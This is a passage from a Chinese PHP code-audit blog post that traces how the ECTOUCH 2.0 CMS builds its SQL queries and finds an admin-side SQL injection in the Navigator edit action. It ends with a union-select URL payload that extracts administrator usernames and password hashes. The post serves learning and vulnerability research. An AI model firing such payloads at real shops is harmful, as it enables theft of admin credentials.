                if (!empty($data)){
                    return $data;
                }
                $query = $this->db->query($this->sql, $params);//调用数据库驱动实例查询
                while ($row = $this->db->fetchArray($query)) {
                    $data[] = $row;
                }
                if (!is_array($data)) {
                    $data = array();
                }
                $this->_writeCache($data);
                return $data;
            } else {
                return $this->db->execute($this->sql, $params); //不是查询条件，直接执行
            }
        }
## 0x4 系统情况初步集合
xss漏洞不能带入单引号,原生全局变量可以带入双引号可能导致注入漏洞
    'DEBUG' => false, // 是否开启调试模式，true开启，false关闭
主要是全局的addslashes过滤,底层是escape过滤参数query过滤了特殊字符,还用单引号括起来,基本不可能默认关闭debug,所以没有报错注入,考虑盲注,联合注入但是可以考虑键值、二次注入和order等的注入。
其他漏洞xml,上传,包含,命令执行,文件读取、文件删除等这个可以通过搜索关键字进行逆向分析逻辑漏洞、越权针对功能点,分析权限分配规则等
## 0x5 前台注入
    .
    ├── AboutController.class.php
    ├── ActivityController.class.php
    ├── AfficheController.class.php
    ├── ApiController.class.php
    ├── ArticleController.class.php
    ├── AuctionController.class.php
    ├── BrandController.class.php
    ├── CategoryController.class.php
    ├── CommentController.class.php
    ├── CommonController.class.php
    ├── ExchangeController.class.php
    ├── FlowController.class.php
    ├── GoodsController.class.php
    ├── GroupbuyController.class.php
    ├── IndexController.class.php
    ├── OauthController.class.php
    ├── PublicController.class.php
    ├── RespondController.class.php
    ├── SmsController.class.php
    ├── SnatchController.class.php
    ├── TopicController.class.php
    ├── UserController.class.php
    ├── WechatController.class.php
    └── WholesaleController.class.php
​我花了差不多两个小时,一个一个控制器,一个一个model类地去看,可能是我太菜了
发现可控参数要么被intval掉,要么就是在model类被单引号括起来,也没找到啥可以绕过的函数,
这里没有审计出前台注入可能让大家失望了,但是考完试我会继续通读、细读代码,寻找到前台注入。
在这里,强烈跪求大师傅,可以审计下这个cms,然后指点下我该如何下手。
## 0x6 后台Navigator id union 注入
前台没希望,但是如果一个洞都没找到那么这个文章的价值就很难体现出来了
于是随手点了个后台控制器`mobile/include/apps/admin/controllers/NavigatorController.class.php`
结果拖着看看就发现了明显的注入点,后台应该还有其他注入点,但是我感觉后台注入真的鸡肋,这里为了更好的理解程序的运行原理,我就决定分析一波
**sql语句入库过程对应上面的分析** 。
下面分析操作主要是model类:`upload/mobile/include/apps/common/models/BaseModel.class.php`
//68 Lines
     public function edit() {
            $id = I('id'); //通过$_GET传递id的值可控
            if (IS_POST) { //跳过
                    ...............
            }
            //查询附表信息           
            $result = $this->model->table('touch_nav')->where('id=' . $id)->find(); //注入点
            /* 模板赋值 */
            $this->assign('info', $result);
            $this->assign('ur_here', L('navigator'));
            $this->assign('action_link', array('text' => L('go_list'), 'href' => url('index')));
            $this->display();
        }
`where('id=' . $id)` 这里很明显没有用单引号括起来,直接拼接变量
又因为是`where`后的所以可以导致联合查询。
这里跟进下流程:
`$this->model->table('touch_nav')`
        public function table($table, $ignorePre = false) {
            if ($ignorePre) { //跳过
                $this->options['table'] = $table;
            } else {
                $this->options['table'] = $this->config['DB_PREFIX'] . $table;
            }
            return $this;
        }
这里主要设置了`$this->options['table']`值,然后返回`$this` 去调用`where`方法
`$this->where('id=' . $id)` 跟进:
因为`where`方法不存在,调用__call构造函数,分析一波
        public function __call($method, $args) { 
            $method = strtolower($method);  //小写
            if (in_array($method, array('field', 'data', 'where', 'group', 'having', 'order', 'limit', 'cache'))) { //$method='where' 满足
                $this->options[$method] = $args[0]; //接收数据
                if ($this->options['field'] == '')
                    $this->options['field'] = '*';
                return $this; //返回对象，连贯查询
            } else {
                throw new Exception($method . '方法在EcModel.class.php类中没有定义');
            }
        }
可以看到主要是`$args[0`赋值给`$this->options[$method]`
(`$args='id=' . $id注入内容, $method='where'` )
然后继续返回了对象`$this->find()`
        public function find() {
            $this->options['limit'] = 1; //限制只查询一条数据
            $data = $this->select(); //开始进入查询
            return isset($data[0]) ? $data[0] : false;
        }
可以看到前面操作主要是把条件赋值给`$this->options`数组
`$data = $this->select();`进入查询,选择跟进
        public function select() {
            $table = $this->options['table']; //当前表
            $field = $this->options['field']; //查询的字段
            $where = $this->_parseCondition(); //条件
            return $this->query("SELECT $field FROM $table $where", array(), true);
        }
这里有个`$where = $this->_parseCondition();` 这个解析条件的函数上面没分析,这里选择分析一波,跟进
        private function _parseCondition() {
            $condition = $this->db->parseCondition($this->options);
            $this->options['where'] = '';
            $this->options['group'] = '';
            $this->options['having'] = '';
            $this->options['order'] = '';
            $this->options['limit'] = '';
            $this->options['field'] = '*';
            return $condition;
        }
这里就回到了我们开始讲的数据库驱动类实例`$this->db->parseCondition`
上面分析过了,字符串直接进行拼接,然后返回正常的`where`条件写法 ex`where id=1`
继续分析`$this->query("SELECT $field FROM $table $where", array(), true);`
         */
        public function query($sql, $params = array(), $is_query = false) {
            if (empty($sql))
                return false;
            $sql = str_replace('{pre}', $this->pre, $sql); //表前缀替换
            $this->sql = $sql;
            if ($this->queryCount++ queryLog[] = $sql;
            }
            if ($this->queryTime == '') {
                if (PHP_VERSION >= '5.0.0') {
                    $this->queryTime = microtime(true);
                } else {
                    $this->queryTime = microtime();
                }
            }
            //判断当前的sql是否是查询语句
            if ($is_query || stripos(trim($sql), 'select') === 0) {
                $data = $this->_readCache();
                if (!empty($data)){
                    return $data;
                }
                $query = $this->db->query($this->sql, $params);
                while ($row = $this->db->fetchArray($query)) {
                    $data[] = $row;
                }
                if (!is_array($data)) {
                    $data = array();
                }
                $this->_writeCache($data);
                return $data;
            } else {
                return $this->db->execute($this->sql, $params); //不是查询条件，直接执行
            }
        }
分析过了 `query`查询了,`$query = $this->db->query($this->sql, $params);`
进入数据库驱动类实例,这个前面也分析过了,字符串直接进入原生查询,这里就知道完整入库了。
**关于利用(如果后台注入还需要盲注那真的太low了)** :
`$this->assign('info', $result);` 这里把sql查询的结果反回来了,跟进
        protected function assign($name, $value) {
            return $this->tpl()->assign($name, $value);
        }
`$this->tpl()`->`assign`
        public function assign($name, $value = '') {
            if (is_array($name)) {
                foreach ($name as $k => $v) {
                    $this->vars[$k] = $v;
                }
            } else {
                $this->vars[$name] = $value;
            }
        }
设置了`$this->vars[$name]`
            /* 模板赋值 */
            $this->assign('info', $result);
            $this->assign('ur_here', L('navigator'));
            $this->assign('action_link', array('text' => L('go_list'), 'href' => url('index')));
            $this->display();
这里想看如何渲染模版,跟进`$this->display();`
        protected function display($tpl = '', $return = false, $is_tpl = true) {
            if ($is_tpl) {
                $tpl = empty($tpl) ? strtolower(CONTROLLER_NAME . '_' . ACTION_NAME) : $tpl;
                if ($is_tpl && $this->layout) {
                    $this->__template_file = $tpl;
                    $tpl = $this->layout;
                }
            }
            $this->tpl()->config ['TPL_TEMPLATE_PATH'] = BASE_PATH . 'apps/' . C('_APP_NAME') . '/view/';
            $this->tpl()->assign($this->_data);
            return $this->tpl()->display($tpl, $return, $is_tpl);
        }
然后进入:
     public function display($tpl = '', $return = false, $is_tpl = true) {
            //如果没有设置模板，则调用当前模块的当前操作模板
            if ($is_tpl && ($tpl == "") && (!empty($_GET['_module'])) && (!empty($_GET['_action']))) {
                $tpl = $_GET['_module'] . "/" . $_GET['_action'];
            }
            if ($return) {
                if (ob_get_level()) {
                    ob_end_flush();
                    flush();
                }
                ob_start();
            }
            extract($this->vars, EXTR_OVERWRITE);
            if ($is_tpl && $this->config['TPL_CACHE_ON']) {
                define('ECTOUCH', true);
                $tplFile = $this->config['TPL_TEMPLATE_PATH'] . $tpl . $this->config['TPL_TEMPLATE_SUFFIX'];
                $cacheFile = $this->config['TPL_CACHE_PATH'] . md5($tplFile) . $this->config['TPL_CACHE_SUFFIX'];
                if (!file_exists($tplFile)) {
                    throw new Exception($tplFile . "模板文件不存在");
                }
                //普通的文件缓存
                if (empty($this->config['TPL_CACHE_TYPE'])) {
                    if (!is_dir($this->config['TPL_CACHE_PATH'])) {
                        @mkdir($this->config['TPL_CACHE_PATH'], 0777, true);
                    }
                    if ((!file_exists($cacheFile)) || (filemtime($tplFile) > filemtime($cacheFile))) {
                        file_put_contents($cacheFile, "" . $this->compile($tpl)); //写入缓存
                    }
                    include( $cacheFile ); //加载编译后的模板缓存
                } else {
                    //支持memcache等缓存
                    $tpl_key = md5(realpath($tplFile));
                    $tpl_time_key = $tpl_key . '_time';
                    static $cache = NULL;
                    $cache = is_object($cache) ? $cache : new EcCache($this->config, $this->config['TPL_CACHE_TYPE']);
                    $compile_content = $cache->get($tpl_key);
                    if (empty($compile_content) || (filemtime($tplFile) > $cache->get($tpl_time_key))) {
                        $compile_content = $this->compile($tpl);
                        $cache->set($tpl_key, $compile_content, 3600 * 24 * 365); //缓存编译内容
                        $cache->set($tpl_time_key, time(), 3600 * 24 * 365); //缓存编译内容
                    }
                    eval('?>' . $compile_content);
                }
            } else {
                eval('?>' . $this->compile($tpl, $is_tpl)); //直接执行编译后的模板
            }
            if ($return) {
                $content = ob_get_contents();
                ob_end_clean();
                return $content;
            }
        }
`extract($this->vars, EXTR_OVERWRITE);` 这里开始生成符号表的变量,然后进入编译,然后匹配替换掉模版的值
然后你去模版看看`navigator_edit.html` 查看相应的变量
              {$lang['item_url']}:
这里的变量就会被返回结果给替换掉。
模版渲染原理有点大块头,后面如果挖掘代码注入之类的,我再进行详细的解读。
####  0x6.1 如何利用
`select * from ecs_touch_nav where id=1` 可以知道有10列,直接构造
`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?m=admin&c=navigator&a=edit&id=-1
union select 1,2,3,password,5,6,7,user_name,9,10 from ecs_admin_user`
mysql运行的语句是:
到这里如果你还不理解,你就可以尝试代入payload重新阅读本菜鸡的代码。
## 0x7 感受
这里首先非常感谢phpoop师傅在先知发的文章让我有了动力,去尝试系统地审计一个cms,但是审计的过程也发现自己真的很菜,首先对tp框架不熟悉(代码能力真的菜),对漏洞了解真的少,没有那种感觉,不像师傅轻轻松松很容易发现前台注入,代码执行那种高危漏洞。
最后希望有师傅能指点下我的代码审计, **这也是我写这个文章的初衷**
挖掘这个cms的起因是在补天看到比较多的注入点还有个xxe但是不清楚版本,也不清楚是前台还是后台注入
当时脑子一热找下了模版堂的安装包,安装过程的时候发现是ECTOUCH2.0版本的,
程序代码我上传到了githud地址:[ **CodeCheck** ](https://github.com/mstxq17/CodeCheck/)
希望师傅们有空可以审计下,指点下我,这个cms我会继续研究和分析下去,也会继续把文章写下去
当作我学习php代码审计一个起点。
## 0x8 参考文章
[PbootCMS漏洞合集之审计全过程之一-网站基本架构](https://xz.aliyun.com/t/3530)
[PbootCMS漏洞合集之审计全过程之二-了解系统参数与底层过滤情况](https://xz.aliyun.com/t/3531)